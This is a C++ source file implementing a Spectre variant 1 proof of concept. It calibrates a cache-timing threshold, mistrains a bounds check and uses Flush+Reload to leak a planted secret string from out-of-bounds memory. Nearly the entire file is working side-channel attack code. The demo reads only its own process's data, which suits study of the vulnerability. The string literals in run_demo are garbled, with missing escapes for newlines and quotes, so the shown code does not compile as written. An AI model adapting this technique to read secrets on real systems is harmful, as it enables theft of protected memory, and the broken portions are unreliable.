#include "spectre_v1.hpp"

#include "statistics.hpp"
#include "timer.hpp"

#include <array>
#include <cstdint>
#include <cstring>
#include <iostream>
#include <vector>

namespace {

constexpr std::size_t kArray1Size = 16;
constexpr std::size_t kArray1Storage = 160;
constexpr std::size_t kProbeStride = 4096;
constexpr int kProbeValues = 256;
constexpr int kCalibrationSamples = 1000;

alignas(64) std::array<std::uint8_t, kArray1Storage> array1{};
alignas(4096) std::array<std::uint8_t,
                           kProbeValues * kProbeStride> array2{};
volatile std::uint8_t temp = 0;

constexpr char kSecret[] =
    "The Magic Words are Squeamish Ossifrage.";

std::uint64_t calibrate_threshold() {
    std::vector<std::uint64_t> hits;
    std::vector<std::uint64_t> misses;

    hits.reserve(kCalibrationSamples);
    misses.reserve(kCalibrationSamples);

    volatile std::uint8_t* probe = &array2[0];
    temp ^= *probe;

    for (int i = 0; i < kCalibrationSamples; ++i) {
        temp ^= *probe;

        const std::uint64_t hit_start =
            Timer::read_tsc_start();
        temp ^= *probe;
        const std::uint64_t hit_end =
            Timer::read_tsc_end();

        hits.push_back(hit_end - hit_start);

        Timer::clflush(probe);

        const std::uint64_t miss_start =
            Timer::read_tsc_start();
        temp ^= *probe;
        const std::uint64_t miss_end =
            Timer::read_tsc_end();

        misses.push_back(miss_end - miss_start);
    }

    const auto hit = Statistics::summarize(hits);
    const auto miss = Statistics::summarize(misses);

    const auto hit_p99 =
        static_cast<std::uint64_t>(hit.p99);
    const auto miss_median =
        static_cast<std::uint64_t>(miss.median);

    if (miss_median > hit_p99 + 20) {
        return (hit_p99 + miss_median) / 2;
    }

    return hit_p99 + 20;
}

#if defined(__GNUC__) || defined(__clang__)
__attribute__((noinline))
#endif
void victim_function(std::size_t x) {
    if (x < kArray1Size) {
        temp &= array2[
            static_cast<std::size_t>(array1[x]) * kProbeStride
        ];
    }
}

SpectreResult read_byte_impl(
    std::size_t malicious_x,
    int tries,
    std::uint64_t threshold) {
    SpectreResult result;
    result.threshold_cycles = threshold;

    std::array<int, kProbeValues> scores{};

    for (int attempt = 0; attempt < tries; ++attempt) {
        for (int i = 0; i < kProbeValues; ++i) {
            Timer::clflush(
                &array2[static_cast<std::size_t>(i) * kProbeStride]);
        }
        Timer::clflush_fence();

        const std::size_t training_x =
            static_cast<std::size_t>(attempt) % kArray1Size;

        for (int j = 0; j < 30; ++j) {
            const std::size_t x =
                (j % 6 == 5) ? malicious_x : training_x;
            victim_function(x);
        }

        for (int i = 0; i < kProbeValues; ++i) {
            const int mixed = ((i * 167) + 13) & 255;
            volatile std::uint8_t* address =
                &array2[static_cast<std::size_t>(mixed) * kProbeStride];

            const std::uint64_t t0 =
                Timer::read_tsc_start();
            temp ^= *address;
            const std::uint64_t t1 =
                Timer::read_tsc_end();

            if (t1 - t0 <= threshold) {
                ++scores[static_cast<std::size_t>(mixed)];
            }
        }
    }

    int best = 0;
    int second = 0;

    for (int i = 1; i < kProbeValues; ++i) {
        const std::size_t idx =
            static_cast<std::size_t>(i);
        const std::size_t best_idx =
            static_cast<std::size_t>(best);
        const std::size_t second_idx =
            static_cast<std::size_t>(second);

        if (scores[idx] > scores[best_idx]) {
            second = best;
            best = i;
        } else if (i != best &&
                   scores[idx] > scores[second_idx]) {
            second = i;
        }
    }

    result.guessed_value =
        static_cast<std::uint8_t>(best);
    result.score =
        scores[static_cast<std::size_t>(best)];
    result.second_score =
        scores[static_cast<std::size_t>(second)];

    result.success =
        result.score >= (2 * result.second_score + 5);

    return result;
}

} // namespace

SpectreResult SpectreV1::read_byte(
    std::size_t malicious_x,
    int tries) {
    if (tries <= 0 || malicious_x >= kArray1Storage) {
        return {};
    }

    return read_byte_impl(
        malicious_x, tries, calibrate_threshold());
}

std::string SpectreV1::read_string(
    std::size_t start_offset,
    std::size_t length,
    int tries) {
    if (tries <= 0 ||
        start_offset > array1.size() ||
        length > array1.size() - start_offset) {
        return {};
    }

    const std::uint64_t threshold =
        calibrate_threshold();

    std::string result;
    result.reserve(length);

    for (std::size_t i = 0; i < length; ++i) {
        const SpectreResult value =
            read_byte_impl(
                start_offset + i,
                tries,
                threshold);

        result.push_back(
            value.success
                ? static_cast<char>(value.guessed_value)
                : '?');
    }

    return result;
}

void SpectreV1::run_demo(int tries) {
    std::memcpy(
        array1.data() + kArray1Size,
        kSecret,
        sizeof(kSecret));

    for (int i = 0; i < kProbeValues; ++i) {
        temp ^= array2[
            static_cast<std::size_t>(i) * kProbeStride];
    }

    const std::size_t secret_offset = kArray1Size;
    const std::size_t secret_length = sizeof(kSecret) - 1;

    const std::string leaked =
        read_string(
            secret_offset,
            secret_length,
            tries);

    std::cout
        << "
========== Spectre V1 Demo ==========
"
        << "Leaked  : "" << leaked << ""
"
        << "Original: "" << kSecret << ""
"
        << "Match   : "
        << (leaked == kSecret ? "YES" : "NO") << '
'
        << "=====================================
";
}
